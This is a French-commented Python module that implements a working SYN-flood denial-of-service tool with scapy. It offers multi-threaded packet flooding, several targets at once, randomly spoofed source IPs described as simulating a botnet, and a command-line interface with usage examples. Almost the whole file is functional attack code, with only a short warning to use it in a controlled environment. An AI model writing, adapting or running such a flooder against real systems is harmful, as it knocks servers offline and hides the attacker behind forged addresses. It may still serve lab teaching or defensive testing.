"""
Module SYN Flooding - Attaque de Déni de Service (DoS)

Ce module permet de :
1. Générer des paquets TCP SYN en grand volume
2. Saturer la file de connexions d'un serveur cible
3. Supporter le multi-threading pour augmenter le débit
4. Afficher des statistiques en temps réel

ATTENTION: À utiliser uniquement dans un environnement contrôlé et éthique!
"""

import os
import sys
import time
import random
import argparse
import threading
from datetime import datetime
from pathlib import Path
from typing import List, Optional
from scapy.all import IP, TCP, send, sr1  # type: ignore

# Ajouter le répertoire parent au path
sys.path.append(str(Path(__file__).parent.parent))

from utils.logger import get_logger
from utils.network_utils import is_valid_ip


class SYNFlooder:
    """Classe pour gérer le SYN Flooding (mode multi-cibles et IP spoofées)."""

    def __init__(
        self,
        target_ips: List[str],
        target_ports: List[int],
        num_threads: int = 10,
        spoof_pool: Optional[List[str]] = None,
        rate_limit_pps: Optional[int] = None,
        spoof_pool_size: int = 0,
    ):
        """Initialise le SYN Flooder.

        Args:
            target_ips (List[str]): IP des cibles (une ou plusieurs)
            target_ports (List[int]): Ports cibles
            num_threads (int): Nombre de threads à utiliser
            spoof_pool (List[str] | None): IP sources à utiliser pour simuler un botnet
            rate_limit_pps (int | None): Limite de paquets/s par thread (None = illimité)
            spoof_pool_size (int): Nombre d'IP aléatoires à générer pour simuler des bots
        """
        self.target_ips = target_ips or []
        self.target_ports = target_ports or [80]
        self.num_threads = max(1, num_threads)
        self.spoof_pool = spoof_pool or []
        self.spoof_pool_size = max(0, spoof_pool_size)
        self.rate_limit_pps = rate_limit_pps
        self.logger = get_logger("SYNFlood")

        # Variables pour le suivi
        self.packets_sent = 0
        self.is_running = False
        self.start_time = None
        self.lock = threading.Lock()
        self.threads: List[threading.Thread] = []

        # Generate a random spoof pool when requested to emulate a DDoS botnet
        if not self.spoof_pool and self.spoof_pool_size:
            self.spoof_pool = [self._generate_random_ip() for _ in range(self.spoof_pool_size)]

        self.logger.info("🎯 Initialisation du SYN Flooder")
        self.logger.info(f"  Cibles: {self.target_ips} | Ports: {self.target_ports}")
        self.logger.info(f"  Threads: {self.num_threads} | Spoof pool: {len(self.spoof_pool)}")
    
    def _validate_targets(self):
        """Valide les cibles fournies."""
        if not self.target_ips:
            self.logger.error("❌ Aucune cible fournie")
            return False
        for ip in self.target_ips:
            if not is_valid_ip(ip):
                self.logger.error(f"❌ IP invalide: {ip}")
                return False
        for port in self.target_ports:
            if not (1 <= port <= 65535):
                self.logger.error(f"❌ Port invalide: {port}")
                return False
        self.logger.info("✅ Cibles validées")
        return True
    
    def _generate_random_ip(self):
        """Génère une adresse IP source aléatoire."""
        return ".".join(str(random.randint(1, 254)) for _ in range(4))
    
    def _choose_target(self):
        """Choisit aléatoirement une cible (ip, port)."""
        ip = random.choice(self.target_ips)
        port = random.choice(self.target_ports)
        return ip, port

    def _choose_source_ip(self):
        """Retourne une IP source spoofée ou aléatoire."""
        if self.spoof_pool:
            return random.choice(self.spoof_pool)
        return self._generate_random_ip()

    def _send_syn_packet(self):
        """Envoie un paquet TCP SYN avec IP source spoofée."""
        try:
            src_ip = self._choose_source_ip()
            target_ip, target_port = self._choose_target()
            src_port = random.randint(1024, 65535)

            ip_layer = IP(src=src_ip, dst=target_ip)
            tcp_layer = TCP(sport=src_port, dport=target_port, flags="S")

            packet = ip_layer / tcp_layer
            send(packet, verbose=False)

            with self.lock:
                self.packets_sent += 1
        except Exception as e:
            self.logger.error(f"❌ Erreur lors de l'envoi: {e}")
    
    def _worker_thread(self, thread_id):
        """
        Fonction exécutée par chaque thread
        
        Args:
            thread_id (int): ID du thread
        """
        self.logger.debug(f"Thread {thread_id} démarré")
        
        while self.is_running:
            self._send_syn_packet()
            if self.rate_limit_pps:
                # pause to approximate rate limit per thread
                time.sleep(max(0.0, 1 / float(self.rate_limit_pps)))
        
        self.logger.debug(f"Thread {thread_id} arrêté")
    
    def start_attack(self, duration=None):
        """
        Démarre l'attaque SYN Flooding
        
        Args:
            duration (int): Durée de l'attaque en secondes (None = infini)
        """
        if not self._validate_targets():
            return
        
        self.is_running = True
        self.start_time = datetime.now()
        self.packets_sent = 0
        
        self.logger.attack_started("SYN_FLOOD", f"{self.target_ips}:{self.target_ports}")
        print(f"\n⚡ Attaque SYN Flood lancée contre {self.target_ips}:{self.target_ports}")
        print(f"   Threads actifs: {self.num_threads}")
        print("   Appuyez sur Ctrl+C pour arrêter\n")
        
        # Créer et démarrer les threads
        self.threads = []
        for i in range(self.num_threads):
            thread = threading.Thread(target=self._worker_thread, args=(i,))
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        try:
            # Afficher les statistiques en temps réel
            last_count = 0
            last_time = time.time()
            
            while self.is_running:
                time.sleep(1)
                
                # Calculer le taux de paquets par seconde
                current_time = time.time()
                current_count = self.packets_sent
                elapsed = current_time - last_time
                
                if elapsed > 0:
                    rate = (current_count - last_count) / elapsed
                    
                    # Calculer le temps écoulé total
                    total_elapsed = (datetime.now() - self.start_time).total_seconds()
                    
                    print(f"\r📤 Paquets SYN envoyés: {current_count:,} | "
                          f"Taux: {rate:.0f} pkt/s | "
                          f"Temps: {total_elapsed:.0f}s", 
                          end="", flush=True)
                
                last_count = current_count
                last_time = current_time
                
                # Vérifier la durée si spécifiée
                if duration and (datetime.now() - self.start_time).total_seconds() >= duration:
                    print("\n\n⏱️  Durée atteinte, arrêt de l'attaque...")
                    break
        
        except KeyboardInterrupt:
            print("\n\n🛑 Interruption détectée...")
        
        finally:
            self.stop_attack()
            for thread in self.threads:
                thread.join(timeout=2)
    
    def stop_attack(self):
        """Arrête l'attaque"""
        if not self.is_running:
            return

        self.is_running = False

        print("\n⏹️  Arrêt de l'attaque...")

        # Statistiques
        if self.start_time:
            duration = (datetime.now() - self.start_time).total_seconds()
            avg_rate = self.packets_sent / duration if duration > 0 else 0

            stats = {
                "Durée": f"{duration:.2f} secondes",
                "Paquets envoyés": f"{self.packets_sent:,}",
                "Taux moyen": f"{avg_rate:.0f} paquets/s",
                "Threads utilisés": self.num_threads,
                "Cibles": f"{self.target_ips}:{self.target_ports}",
                "Spoof pool": len(self.spoof_pool)
            }

            self.logger.attack_stopped("SYN_FLOOD", stats)

            print("\n📊 Statistiques finales:")
            for key, value in stats.items():
                print(f"   {key}: {value}")

    # Compat helper for existing call sites
    def start(self, duration=None):
        self.start_attack(duration)

    def stop(self):
        self.stop_attack()
    
    def test_target_port(self):
        """
        Teste si le port cible est ouvert
        
        Returns:
            bool: True si ouvert, False sinon
        """
        target_ip = self.target_ips[0]
        target_port = self.target_ports[0]
        self.logger.info(f"🔍 Test du port {target_port} sur {target_ip}...")
        
        try:
            # Envoyer un SYN et attendre la réponse
            ip_layer = IP(dst=target_ip)
            tcp_layer = TCP(dport=target_port, flags="S")
            
            response = sr1(ip_layer/tcp_layer, timeout=2, verbose=False)
            
            if response:
                if response.haslayer(TCP):
                    flags = response[TCP].flags
                    
                    # SYN-ACK = port ouvert
                    if flags == 0x12:  # SYN-ACK
                        self.logger.info(f"✅ Port {target_port} OUVERT")
                        
                        # Envoyer RST pour fermer proprement
                        rst = IP(dst=target_ip)/TCP(dport=target_port, flags="R")
                        send(rst, verbose=False)
                        
                        return True
                    
                    # RST = port fermé
                    elif flags == 0x14:  # RST-ACK
                        self.logger.info(f"❌ Port {target_port} FERMÉ")
                        return False
            
            self.logger.info(f"⚠️  Aucune réponse du port {target_port}")
            return False
        
        except Exception as e:
            self.logger.error(f"❌ Erreur lors du test: {e}")
            return False


def main():
    """Point d'entrée principal du module"""
    parser = argparse.ArgumentParser(
        description="💥 SYN Flooding - Attaque DoS",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemples d'utilisation:
  sudo python3 syn_flood.py -t 192.168.1.100 -p 80
  sudo python3 syn_flood.py -t 192.168.1.100 -p 80 --threads 20
  sudo python3 syn_flood.py -t 192.168.1.100 -p 80 --duration 60
  sudo python3 syn_flood.py -t 192.168.1.100 -p 80 --test

⚠️  ATTENTION: Utilisez uniquement dans un environnement contrôlé!
Cette attaque peut rendre un serveur inaccessible.
        """
    )
    
    parser.add_argument('-t', '--target', action='append', required=True,
                       help='IP de la cible (répéter pour plusieurs cibles)')
    parser.add_argument('-p', '--port', action='append', type=int, required=True,
                       help='Port(s) de la cible (répéter pour plusieurs ports)')
    parser.add_argument('--threads', type=int, default=10,
                       help='Nombre de threads (défaut: 10)')
    parser.add_argument('--duration', type=int, default=None,
                       help='Durée de l\'attaque en secondes (défaut: infini)')
    parser.add_argument('--rate', type=int, default=None,
                       help='Limite de paquets/s par thread (défaut: illimité)')
    parser.add_argument('--test', action='store_true',
                        help='Tester le premier couple IP/port avant l\'attaque')
    
    args = parser.parse_args()

    # Vérifier les permissions root
    if os.geteuid() != 0:
        print("❌ Ce script nécessite les privilèges root (sudo)")
        sys.exit(1)

    # Créer le flooder
    flooder = SYNFlooder(
        target_ips=args.target,
        target_ports=[int(p) for p in args.port],
        num_threads=args.threads,
        spoof_pool=None,
        rate_limit_pps=args.rate,
    )

    # Tester le port si demandé
    if getattr(args, "test", False):
        flooder.test_target_port()
        print("\n⏸️  Appuyez sur Entrée pour continuer l'attaque ou Ctrl+C pour quitter...")
        try:
            input()
        except KeyboardInterrupt:
            print("\n👋 Au revoir!")
            sys.exit(0)

    # Lancer l'attaque
    flooder.start_attack(duration=args.duration)


if __name__ == "__main__":
    main()
